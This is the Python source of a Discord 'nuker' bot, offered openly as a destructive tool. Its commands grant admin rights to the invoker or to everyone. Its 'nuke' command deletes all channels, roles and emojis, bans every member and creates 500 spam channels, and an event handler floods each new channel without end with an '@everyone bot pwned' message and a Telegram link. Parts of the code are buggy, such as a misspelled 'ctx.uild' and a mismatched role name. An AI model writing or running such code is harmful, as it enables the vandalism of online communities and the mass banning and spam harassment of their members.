import discord
import os
import random
from discord.ext import commands
from discord import Permissions
from colorama import Fore, Back, Style


#----------Basic-Config----------#
# bot_token = os.environ['token'] # Replit Secret that contains bot token (if using replit)
bot_token = 'YOUR_BOT_TOKEN_HERE' # Bot Token
prefix = '.' # Bot Command Prefix
owner_id = [""] # Your Discord Id
#--------------------------------#

#-------Nuke-Command-Config------#
SPAM_CHANNEL =  ["pwned│nuke detonated"] # Spam Channel Name
SPAM_MESSAGE = ["@everyone bot pwned JOIN https://t.me/nukingyou"] # Spam Text
#--------------------------------#

# Other Thing
client = commands.Bot(command_prefix=prefix, help_command=None, intents=discord.Intents.all())



# Bot Working Message
@client.event
async def on_ready():
    os.system('cls')
    print(Back.BLUE + Fore.WHITE + '''
    __  ___      __            ______      __                            
   /  |/  /___ _/ /______     /_  __/___ _/ /_____  ____ _   _____  _____
  / /|_/ / __ `/ //_/ __ \     / / / __ `/ //_/ _ \/ __ \ | / / _ \/ ___/
 / /  / / /_/ / ,< / /_/ /    / / / /_/ / ,< /  __/ /_/ / |/ /  __/ /    
/_/  /_/\__,_/_/|_|\____/    /_/  \__,_/_/|_|\___/\____/|___/\___/_/     
                                                                         ''' + Style.RESET_ALL)
    print(Fore.WHITE + f'''\n\nLogged in as {client.user}\n\nPrefix "{prefix}"\n\n<---Commands--->\n\n{prefix}admin - Gives yourself admin\n{prefix}admin_all - Gives everyone in the server admin\n{prefix}nuke - Complety destroys the server you run this command in\n{prefix}kick <user> - Kicks a user of your choice from the server\n{prefix}ban <user> - Bans a user of your choice from the server\n{prefix}unban <user> - Unbans a user of your choice from the server\n\n<---Other-Information--->\n\nBot Permissions: soon...\n\nServer Invite Link: soon...\n\n\n<---Bot-Logs--->\n\n''' + Style.RESET_ALL)
    
# Commands

# Admin Self
@client.command()
async def admin(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    member = ctx.author
    try:
      await guild.create_role(name="new role")
      print(Fore.GREEN + "Role created!" + Fore.RESET)
    except:
      print(Fore.RED + "Role unable to be created" + Fore.RESET)
    try:
      role = discord.utils.get(guild.roles, name = "new role-2")
      await role.edit(permissions = Permissions.all())
      print(Fore.GREEN + "Role has been given Admin!" + Fore.RESET)
    except:
      print(Fore.RED + "Unable to give role Admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        arole = discord.utils.get(member.guild.roles, name="new role-2")
        await member.add_roles(arole)
        print(Fore.GREEN + f"{member} has been given Admin Role!" + Fore.RESET)
      except:
        print(Fore.RED + f"Unable to give {member} Admin Role" + Fore.RESET)
      return

# Admin All
@client.command()
async def admin_all(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.GREEN + "Everyone has been given Admin!" + Fore.RESET)
    except:
      print(Fore.RED + "Unable to give everyone Admin" + Fore.RESET)
    for channel in guild.channels:
     return

# Nuke Server
@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "@Everyone has been given Admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "unable to give @Everyone Admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    await guild.create_text_channel("Nuke Launched")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

# Kick
@client.command()
async def kick(ctx,member : discord.Member,*,reason= Back.WHITE + Fore.WHITE + "No Reason Provided"+ Style.RESET_ALL):
    await ctx.message.delete()
    try:
     await member.kick(reason=reason)
     print(Fore.GREEN + member.name + " has been kicked from the server for "+reason + Fore.RESET)
    except:
     print(Fore.RED + member.name + " was unable to be kicked likely due to having a role higher than the bot" + Fore.RESET)
    return

# Ban
@client.command()
async def ban(ctx,member : discord.Member,*,reason= Back.WHITE + Fore.WHITE + "No Reason Provided"+ Style.RESET_ALL):
    await ctx.message.delete()
    try:
     await member.ban(reason=reason)
     print(Fore.GREEN + member.name + " has been banned from the server for "+reason + Fore.RESET)
    except:
     print(Fore.RED + member.name + " was unable to be banned likely due to having a role higher than the bot" + Fore.RESET)
    return

# Unban
@client.command()
async def unban(ctx,*,member):
    banned_users = await ctx.guild.bans()
    member_name, member_disc = member.split('>>')

    for banned_entry in banned_users:
        user = banned_entry.user

        if(user.name, user.discriminator)==(member.name,member_disc):

            await ctx.uild.unban(user)
            await print(member.name +" has been unbanned!")
            return

    await print(member+"was not found!")


# Commands end


# Bot Run
client.run(bot_token)
